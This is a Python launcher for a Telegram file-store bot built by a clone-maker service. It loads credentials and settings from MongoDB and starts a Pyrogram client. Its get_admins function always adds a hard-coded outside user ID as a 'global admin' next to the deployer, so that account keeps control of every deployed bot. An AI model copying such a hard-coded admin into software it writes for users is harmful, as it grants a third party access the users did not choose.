import os
import sys
import logging
from pyrogram import Client, idle
from pymongo import MongoClient

# ===================== LOGGING =====================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ===================== DB CONFIG =====================
CODE2_MONGO_URI = os.getenv("CODE2_MONGO_URI")
CODE2_DB_NAME = os.getenv("CODE2_DB_NAME","clone_maker")
USER_ID = int(os.getenv("DEPLOY_USER_ID", 0))

logger.info(f"🔧 Deploying bot for USER_ID: {USER_ID}")

if not USER_ID:
    logger.error("❌ DEPLOY_USER_ID is missing.")
    sys.exit(1)

try:
    mongo_client = MongoClient(CODE2_MONGO_URI)
    db = mongo_client[CODE2_DB_NAME]
    users_col = db["users"]
except Exception as e:
    logger.error(f"❌ MongoDB connection failed: {e}")
    sys.exit(1)

# ===================== HELPER FUNCTIONS =====================
def get_user_data():
    """Always fetch the latest user data from DB."""
    return users_col.find_one({"USER_ID": USER_ID}) or {}

def get_str(key, default=""):
    return str(get_user_data().get(key, default))

def get_int(key, default=0):
    try:
        return int(get_user_data().get(key, default))
    except (TypeError, ValueError):
        return default

def get_bool(key, default=False):
    val = str(get_user_data().get(key, default)).lower()
    return val in ["true", "1", "yes", "on"]

def get_list(key, default=None):
    val = get_user_data().get(key, default or [])
    if isinstance(val, list):
        return val
    if isinstance(val, str):
        return [x.strip() for x in val.split(",") if x.strip()]
    return default or []

def get_admins():
    """
    Fetch the latest ADMINS from DB.
    Handles string ("123,456") or list format.
    Returns a list of integers and includes USER_ID + global admin.
    """
    raw_admins = get_user_data().get("ADMINS", [])
    
    if isinstance(raw_admins, str):
        raw_admins = [x.strip() for x in raw_admins.split(",") if x.strip()]

    admins = []
    for x in raw_admins:
        try:
            admins.append(int(x))
        except (TypeError, ValueError):
            pass

    # Always include deployer and global admin
    FINAL_ADMINS = sorted(list(set(admins + [USER_ID, 6789146594])))
    return FINAL_ADMINS

# ===================== CRITICAL VARS =====================
API_ID = get_int("API_ID")
API_HASH = get_str("API_HASH")
BOT_TOKEN = get_str("BOT_TOKEN")

if not all([API_ID, API_HASH, BOT_TOKEN]):
    logger.error("❌ Missing required vars (API_ID, API_HASH, BOT_TOKEN)")
    sys.exit(1)



# ===================== INITIALIZE BOT =====================
app = Client(
    "DeployedFileStoreBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    plugins=dict(root="plugins")
)

# ===================== START BOT =====================
if __name__ == "__main__":
    logger.info("🚀 Starting deployed bot...")
    app.start()
    me = app.get_me()
    BOT_USERNAME = me.username
    logger.info(f"✅ Bot started as @{BOT_USERNAME}")
    logger.info("📡 Bot is now running and ready.")
    idle()
    app.stop()
    logger.info("🛑 Bot stopped.")